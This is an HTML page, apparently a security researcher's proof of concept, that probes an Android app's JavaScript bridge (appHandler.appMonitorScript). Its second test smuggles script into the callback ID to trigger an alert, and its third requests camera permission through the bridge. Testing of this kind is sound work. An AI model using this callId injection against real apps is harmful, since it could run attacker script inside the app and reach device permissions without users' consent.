<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>测试</title></head>
<body style="background:#111;color:#fff;font-family:monospace;padding:20px;font-size:14px">
<h3 style="color:#c9a96e">callId 注入测试</h3>
<div id="log" style="white-space:pre-wrap"></div>
<script>
var log = document.getElementById('log');
function L(s) { log.textContent += s + "\n"; }

L("bridge: " + (typeof window.appHandler !== 'undefined' ? 'YES' : 'NO'));
L("origin: " + location.origin);

if (typeof window.appHandler !== 'undefined') {
    // 回调接收
    window.sep = window.sep || {};
    window.sep._onSuccess = function(id, d) { L("SUCCESS cb id=" + id); };
    window.sep._onFailure = function(id, e) { L("FAIL cb id=" + id); };

    // 测试1: 正常调用 getExpFlag (确认 bridge 工作)
    L("\n--- test1: normal getExpFlag ---");
    try {
        appHandler.appMonitorScript('getExpFlag', 'normal_id', '{"expKey":"test"}');
        L("called OK");
    } catch(e) { L("error: " + e); }

    // 测试2: callId 注入 alert (确认注入可行)
    L("\n--- test2: callId injection alert ---");
    try {
        appHandler.appMonitorScript('getExpFlag', "0);alert('CALLID_INJECTION_WORKS');//", '{"expKey":"test"}');
        L("called OK (alert should show)");
    } catch(e) { L("error: " + e); }

    // 测试3: requestPermission (确认弹窗)
    L("\n--- test3: requestPermission ---");
    try {
        appHandler.appMonitorScript('requestPermission', 'perm_test', '{"permission":"android.permission.CAMERA"}');
        L("called OK (dialog should show)");
    } catch(e) { L("error: " + e); }
}
</script>
</body>
</html>
